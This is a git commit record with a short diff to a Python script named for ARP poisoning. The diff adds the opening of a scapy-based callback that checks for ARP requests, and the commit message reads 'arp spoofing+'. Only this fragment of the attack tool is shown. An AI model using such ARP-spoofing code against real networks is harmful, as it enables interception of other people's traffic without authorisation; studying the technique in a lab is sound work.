132415ca7f31413c51a583173bda71919c6696eb
Faan Ross <moi@faanross.com>
2023-03-10 12:01:44 -0500

    arp spoofing+

--- arp_poison_v2_nc.py
+++ arp_poison_v2_nc.py
@@ -3,7 +3,12 @@
 import sys
 from scapy.all import sendp, sniff, ARP, Ether
 
+
 if len(sys.argv) < 2:
     print(sys.argv[0] + " <iface >")
     sys.exit(0)
 
+
+def arp_poison_callback( packet):
+    # Got ARP request?
+    if packet[ARP].op == 1:
